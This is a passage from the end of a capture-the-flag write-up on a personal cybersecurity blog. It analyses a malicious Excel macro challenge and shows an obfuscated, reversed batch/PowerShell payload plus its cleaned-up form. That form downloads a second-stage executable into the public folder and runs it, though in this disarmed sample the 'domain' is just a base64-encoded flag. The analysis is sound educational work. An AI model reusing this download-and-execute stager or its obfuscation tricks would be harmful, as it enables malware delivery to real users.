 </span><span class="p">}</span><span class="w"> </span><span class="p">;</span><span class="s1">'spooooow'</span><span class="w"> </span><span class="n">tuptuO-etirW</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">hctac</span><span class="w"> </span><span class="p">};</span><span class="n">kaerb</span><span class="w"> </span><span class="p">;</span><span class="n">vnE</span><span class="err">$</span><span class="w"> </span><span class="nx">metI-ekovnI</span><span class="p">;)</span><span class="n">vnE</span><span class="err">$</span><span class="w"> </span><span class="p">,</span><span class="nx">a</span><span class="err">$</span><span class="p">(</span><span class="n">eliFdaolnwoD.tneilCbeW</span><span class="err">$</span><span class="p">{</span><span class="w"> </span><span class="n">yrt</span><span class="p">{</span><span class="w"> </span><span class="p">)</span><span class="n">etiSbeW</span><span class="err">$</span><span class="w"> </span><span class="nx">ni</span><span class="w"> </span><span class="nx">a</span><span class="err">$</span><span class="p">(</span><span class="w"> </span><span class="n">hcaerof</span><span class="p">;</span><span class="s1">'exe.'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">emaneliF</span><span class="err">$</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">cilbup:vne</span><span class="err">$</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vnE</span><span class="err">$</span><span class="p">;</span><span class="s1">'f2lk3m2ja'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">emaneliF</span><span class="err">$</span><span class="p">;</span><span class="s1">'9RXMfJHMm9FbsRjZfNDbw92Mw91dwg2XyNDZuBzdfFzXuBTbtBzYuV3X0BjbfNXMfNjc0cHb002XBJkV7RWZudHc'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">etisbeW</span><span class="err">$</span><span class="p">;</span><span class="n">tneilCbeW.teN</span><span class="w"> </span><span class="nx">tcejbo-wen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tneilCbeW</span><span class="err">$</span><span class="o">&amp;&amp;</span><span class="w">
 </span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">W</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="p">(</span><span class="mi">337</span><span class="p">;</span><span class="nt">-1</span><span class="p">;</span><span class="mi">0</span><span class="p">)</span><span class="kr">do</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="nx">AW7L</span><span class="o">=!</span><span class="n">AW7L</span><span class="o">!!</span><span class="nx">riMt:~</span><span class="o">%</span><span class="nx">W</span><span class="p">,</span><span class="nx">1</span><span class="o">!&amp;&amp;</span><span class="nx">if</span><span class="w"> </span><span class="o">%</span><span class="nx">W</span><span class="o">==</span><span class="mi">0</span><span class="w"> </span><span class="n">powershell</span><span class="w"> </span><span class="o">!</span><span class="nx">AW7L:~6</span><span class="o">!</span><span class="w"> 
</span></code></pre></div></div> <p>Again, this payload is heavily obfuscated and the main part is reversed. After a little clean up and reversing the main code, the payload looks like this:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$WebClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">;</span><span class="w">
</span><span class="nv">$Website</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'cHduZWR7VkJBX200bHc0cjNfMXNfbjB0X3VuYzBtbTBuXzFfdzBuZDNyX2gwd19wM29wbDNfZjRsbF9mMHJfMXR9'</span><span class="p">;</span><span class="w">
</span><span class="nv">$Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'aj2m3kl2f'</span><span class="p">;</span><span class="w">
</span><span class="nv">$Env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">public</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'.exe'</span><span class="p">;</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$a</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$WebSite</span><span class="p">)</span><span class="w"> 
	</span><span class="p">{</span><span class="kr">try</span><span class="w"> 
		</span><span class="p">{</span><span class="nv">$WebClient</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="w"> </span><span class="nv">$Env</span><span class="p">);</span><span class="w">
		</span><span class="n">Invoke-Item</span><span class="w"> </span><span class="nv">$Env</span><span class="p">;</span><span class="w"> 
		</span><span class="kr">break</span><span class="p">;}</span><span class="w"> 
	</span><span class="kr">catch</span><span class="w"> 
		</span><span class="p">{</span><span class="w"> </span><span class="n">Write-Output</span><span class="w"> </span><span class="s1">'wooooops'</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>This payload basically tries to download the second-stage payload. It would normally have an array of domains defined in the $Website variable that it can contact. Then it tries to download the ‘aj2m3kl2f’ binary from those domains, saves it, and then tries to invoke it. In this case, however, because the malware has been disarmed, the domain is actually just a base64 encoded string. If decode that, we get our flag: pwned{VBA_m4lw4r3_1s_n0t_unc0mm0n_1_w0nd3r_h0w_p3opl3_f4ll_f0r_1t}</p> <h2 id="conclusion">Conclusion</h2> <p>I really liked this challenge as it introduces macros as a common technique that get often used for initial infection. While it wasn’t too complicated, the different techniques needed to solve this challenge were however a nice change from the usual ELF Reversing that you can find in CTFs. Shoutout to xenocidewiki for creating a bunch of great challenges and introducing more variety to the category.Until next time, -Trigleos</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/excel-macro/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Pol Thill </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/trigleos.png" alt="Pol Thill" /> </div> <div class="col-md-6"> <p class="author_bio">Hi I am Pol, a Cybersecurity student.</p> <p>Email : pthill99@gmail.com</p> <p>Website : https://trigleos.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/trigleos" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/pol-thill-985b02190" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/tr3gleos" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> </div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Mallux</div> <div class="card-body"> <p class="author_bio">Mallux is a blog where I write about Cybersecurity.</p> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#Csharp"></div> <li class="tag-head"> <a href="/blog/categories/Csharp">Csharp</a> </li> <a name="Csharp"></a> <div id="#Reversing"></div> <li class="tag-head"> <a href="/blog/categories/Reversing">Reversing</a> </li> <a name="Reversing"></a> <div id="#Windows_Reversing"></div> <li class="tag-head"> <a href="/blog/categories/Windows_Reversing">Windows_Reversing</a> </li> <a name="Windows_Reversing"></a> <div id="#Assembly"></div> <li class="tag-head"> <a href="/blog/categories/Assembly">Assembly</a> </li> <a name="Assembly"></a> <div id="#Linux_Reversing"></div> <li class="tag-head"> <a href="/blog/categories/Linux_Reversing">Linux_Reversing</a> </li> <a name="Linux_Reversing"></a> <div id="#Ransomware"></div> <li class="tag-head"> <a href="/blog/categories/Ransomware">Ransomware</a> </li> <a name="Ransomware"></a> <div id="#Networking"></div> <li class="tag-head"> <a href="/blog/categories/Networking">Networking</a> </li> <a name="Networking"></a> <div id="#Forensics"></div> <li class="tag-head"> <a href="/blog/categories/Forensics">Forensics</a> </li> <a name="Forensics"></a> <div id="#RSA"></div> <li class="tag-head"> <a href="/blog/categories/RSA">RSA</a> </li> <a name="RSA"></a> <div id="#AES"></div> <li class="tag-head"> <a href="/blog/categories/AES">AES</a> </li> <a name="AES"></a> <div id="#Threat_Hunting"></div> <li class="tag-head"> <a href="/blog/categories/Threat_Hunting">Threat_Hunting</a> </li> <a name="Threat_Hunting"></a> <div id="#Incident_Response"></div> <li class="tag-head"> <a href="/blog/categories/Incident_Response">Incident_Response</a> </li> <a name="Incident_Response"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/">Home</a> </li> <li> <a href="/blog">Blog</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted on <a href="https://www.netlify.com/">Netlify</a>. </p> </footer> <script> var options = { classname: 'my-class', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <script src="/assets/js/mode-switcher.js"></script> </body> </html>
